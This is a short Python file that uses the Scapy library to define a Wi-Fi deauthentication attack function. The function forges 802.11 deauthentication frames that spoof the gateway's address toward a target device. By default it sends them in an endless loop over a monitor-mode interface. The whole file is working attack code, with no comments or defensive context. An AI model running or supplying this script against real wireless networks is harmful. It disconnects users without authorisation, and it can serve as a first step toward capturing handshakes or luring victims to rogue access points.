from scapy.all import *
def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):

  
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
